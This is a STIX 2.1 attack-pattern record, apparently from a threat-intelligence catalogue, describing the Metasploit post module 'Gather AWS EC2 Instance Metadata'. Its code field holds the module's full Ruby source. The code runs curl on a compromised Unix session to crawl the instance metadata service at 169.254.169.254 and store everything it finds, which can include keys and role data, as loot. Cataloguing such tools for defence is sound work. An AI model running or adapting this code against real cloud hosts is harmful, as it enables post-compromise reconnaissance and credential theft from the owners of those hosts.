{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--22fb5c1b-4d68-4016-8188-aba5e0530919",
    "created": "2024-08-14T16:33:19.188883Z",
    "modified": "2024-08-14T16:33:19.188887Z",
    "name": "Gather AWS EC2 Instance Metadata",
    "description": " This module will attempt to connect to the AWS EC2 instance metadata service and crawl and collect all metadata known about the session'd host.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/aws_ec2_instance_metadata.rb",
            "external_id": "aws_ec2_instance_metadata.rb"
        },
        {
            "source_name": "reference",
            "url": "http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Gather AWS EC2 Instance Metadata',\n        'Description' => %q{\n          This module will attempt to connect to the AWS EC2 instance metadata service\n          and crawl and collect all metadata known about the session'd host.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Jon Hart <jon_hart[at]rapid7.com>' # original metasploit module\n        ],\n        # TODO: is there a way to do this on Windows?\n        'Platform' => %w[unix],\n        'SessionTypes' => %w[shell meterpreter],\n        'References' => [\n          [ 'URL', 'http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html' ]\n        ]\n      )\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('TARGETURI', [true, 'AWS EC2 Instance metadata URI', 'http://169.254.169.254/latest/meta-data/'])\n      ]\n    )\n  end\n\n  def check_aws_metadata\n    resp = simple_get(@target_uri)\n    unless resp =~ /^instance-id$/\n      fail_with(Failure::BadConfig, 'Session does not appear to be on an AWS EC2 instance')\n    end\n    resp\n  end\n\n  def check_curl\n    unless cmd_exec('curl --version') =~ /^curl \\d/\n      fail_with(Failure::BadConfig, 'curl is not installed')\n    end\n  end\n\n  def get_aws_metadata(base_uri, base_resp)\n    r = {}\n    base_resp.split(/\\r?\\n/).each do |l|\n      new_uri = \"#{base_uri}#{l}\"\n      if l =~ %r{/$}\n        # handle a directory\n        r[l.gsub(%r{/$}, '')] = get_aws_metadata(new_uri, simple_get(new_uri))\n      elsif new_uri.to_s =~ %r{/public-keys/} && /^(?<key_id>\\d+)=/ =~ l\n        # special case handling of the public-keys endpoint\n        new_uri = new_uri.slice(0..(new_uri.index(%r{/public-keys/}) + '/public-keys'.length))\n        key_uri = \"#{new_uri}#{key_id}/\"\n        key_resp = simple_get(key_uri)\n        r[key_id] = get_aws_metadata(key_uri, key_resp)\n      else\n        r[l] = simple_get(new_uri)\n      end\n    end\n    r\n  end\n\n  def run\n    check_curl\n    resp = check_aws_metadata\n\n    print_status('Gathering AWS EC2 instance metadata')\n    metadata = get_aws_metadata(@target_uri, resp)\n\n    metadata_json = JSON.pretty_generate(metadata)\n    file = store_loot('aws.ec2.instance.metadata', 'text/json', session, metadata_json, 'aws_ec2_instance_metadata.json', 'AWS EC2 Instance Metadata')\n\n    if datastore['VERBOSE']\n      vprint_good('AWS EC2 instance metadata')\n      print_line(metadata_json)\n    end\n    print_good(\"Saved AWS EC2 instance metadata to to #{file}\")\n  end\n\n  def setup\n    @target_uri ||= URI(datastore['TARGETURI'])\n  rescue ::URI::InvalidURIError\n    fail_with(Failure::BadConfig, \"Invalid TARGETURI: #{datastore['TARGETURI']}\")\n  end\n\n  def simple_get(url)\n    vprint_status(\"Fetching #{url}\")\n    cmd_exec(\"curl -s #{url}\")\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[unix]"
    ]
}